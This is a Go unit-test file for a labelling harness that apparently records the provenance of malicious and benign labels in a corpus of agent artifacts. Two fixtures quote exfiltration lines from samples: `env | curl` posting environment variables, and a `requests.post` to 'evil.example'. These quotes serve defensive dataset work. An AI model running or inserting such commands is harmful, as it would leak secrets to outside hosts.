// SPDX-License-Identifier: MIT

package derive

import (
	"strings"
	"testing"

	"github.com/basdotio/agent-artifact-corpus/harness/internal/manifest"
)

func entryWith(d manifest.Derive) manifest.Entry {
	return manifest.Entry{ID: "an-entry", Derive: &d}
}

// A constant is not a measurement of anything. `constant:malicious` says "everything in this
// batch is malicious", which is a statement about the batch, and `assumed` is its honest name.
func TestBasisFromConstantClassIsAssumed(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
	got := basisBlock(e, Coord{Class: "malicious"})

	if !strings.Contains(got, "class: assumed") {
		t.Errorf("got %q, want class: assumed", got)
	}
	if !strings.Contains(got, "assumption:") {
		t.Error("`assumed` without an assumption cannot be checked by a reader")
	}
	if !strings.Contains(got, "an-entry") {
		t.Error("the assumption should name the batch it is about")
	}
}

// Reading the upstream's own field is a different claim from computing something from it.
func TestBasisFromFieldClassIsUpstream(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "field:verdict"})
	got := basisBlock(e, Coord{Class: "malicious"})

	if !strings.Contains(got, "class: upstream") {
		t.Errorf("got %q, want class: upstream", got)
	}
	if !strings.Contains(got, "source_field: verdict") {
		t.Errorf("got %q, want the upstream field named", got)
	}
	if !strings.Contains(got, "source_value: malicious") {
		t.Errorf("got %q, want the upstream value recorded", got)
	}
}

func TestBasisSeverityFollowsItsOwnSource(t *testing.T) {
	// The axes were established differently and must not share one answer: cisco's class and
	// severity are both constants, skillsgoat reads severity from a field.
	e := entryWith(manifest.Derive{ClassFrom: "field:verdict", SeverityFrom: "constant:high"})
	got := basisBlock(e, Coord{Class: "malicious", Severity: "high"})

	if !strings.Contains(got, "class: upstream") || !strings.Contains(got, "severity: assumed") {
		t.Errorf("got %q, want class: upstream with severity: assumed", got)
	}
}

// The dimension axis is the one that is actually scored from `read`, so claiming it without
// a locatable quote is the failure the vocabulary exists to prevent. A hand-read dimension
// whose evidence was recorded only in a YAML comment gets NO basis rather than a flattering
// one: the axis is then unscoreable, which is true, instead of wrongly scoreable.
func TestHandReadDimensionWithoutEvidenceClaimsNothing(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
	got := basisBlock(e, Coord{Class: "malicious", Dimensions: []string{"exfiltration"}, HandReadDimension: true})

	if strings.Contains(got, "dimension: read") {
		t.Error("claimed `read` with no evidence — VerifyEvidence would have nothing to find")
	}
	if strings.Contains(got, "dimension:") {
		t.Errorf("got %q, want no dimension basis at all", got)
	}
}

func TestCategoryMapDimensionIsDerived(t *testing.T) {
	e := entryWith(manifest.Derive{
		ClassFrom:       "constant:malicious",
		CategoryAxisMap: map[string]manifest.Targets{"data-exfiltration": {"dim:exfiltration"}},
	})
	got := basisBlock(e, Coord{Class: "malicious", Dimensions: []string{"exfiltration"}})

	if !strings.Contains(got, "dimension: derived") {
		t.Errorf("got %q, want dimension: derived", got)
	}
	if !strings.Contains(got, "rule: category_axis_map") {
		t.Errorf("got %q, want the rule named", got)
	}
}

func TestBenignSampleWithNoDimensionGetsNoDimensionBasis(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "constant:benign"})
	got := basisBlock(e, Coord{Class: "benign"})

	if strings.Contains(got, "dimension:") {
		t.Errorf("got %q — a sample with no dimension should claim no basis for one", got)
	}
	if !strings.Contains(got, "class: assumed") {
		t.Errorf("got %q, want class: assumed", got)
	}
}

// An entry whose class_from is neither shape must not silently produce a basis. Guessing here
// would put a fabricated provenance on every sample of that entry.
func TestUnknownClassFromProducesNoBasis(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "something-else"})
	if got := basisBlock(e, Coord{Class: "malicious"}); got != "" {
		t.Errorf("got %q, want no basis block for an unrecognised class_from", got)
	}
}

// The generated YAML has to parse back into the label schema, or every derived sample breaks
// at once.
func TestBasisBlockIsWellFormedYAML(t *testing.T) {
	e := entryWith(manifest.Derive{
		ClassFrom:       "field:verdict",
		SeverityFrom:    "field:severity",
		CategoryAxisMap: map[string]manifest.Targets{"x": {"dim:exfiltration"}},
	})
	got := basisBlock(e, Coord{Class: "malicious", Severity: "high", Dimensions: []string{"exfiltration"}})

	if !strings.HasPrefix(got, "basis:\n") {
		t.Errorf("got %q, want it to start with the basis key", got)
	}
	for _, line := range strings.Split(strings.TrimRight(got, "\n"), "\n")[1:] {
		if !strings.HasPrefix(line, "  ") {
			t.Errorf("line %q is not indented under `basis:`", line)
		}
	}
}

// With evidence recorded, a hand-read dimension becomes what it always was: a person's
// reading, now checkable. This is the whole point of the long override form.
func TestHandReadDimensionWithEvidenceIsRead(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
	got := basisBlock(e, Coord{
		Class:             "malicious",
		Dimensions:        []string{"exfiltration"},
		HandReadDimension: true,
		DimensionEvidence: &manifest.Evidence{
			File: "SKILL.md", Lines: "9", Quote: `env | curl -sS -X POST --data-binary @-`,
		},
	})

	if !strings.Contains(got, "dimension: read") {
		t.Errorf("got %q, want dimension: read", got)
	}
	for _, want := range []string{"evidence:", "file: SKILL.md", `lines: "9"`, "quote:"} {
		if !strings.Contains(got, want) {
			t.Errorf("got %q, missing %q", got, want)
		}
	}
	if !strings.Contains(got, "env | curl") {
		t.Errorf("got %q — the quote itself must be present, not just the key", got)
	}
}

// A quote containing a double quote is ordinary in this corpus: half the evidence is shell.
// Emitting it unescaped would produce a label that does not parse.
func TestEvidenceQuoteIsEscaped(t *testing.T) {
	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
	got := basisBlock(e, Coord{
		Class: "malicious", Dimensions: []string{"exfiltration"}, HandReadDimension: true,
		DimensionEvidence: &manifest.Evidence{
			File: "c.py", Lines: "3", Quote: `requests.post("https://evil.example/x", json=d)`,
		},
	})
	if !strings.Contains(got, `\"https://evil.example/x\"`) {
		t.Errorf("got %q, want the inner quotes escaped", got)
	}
}
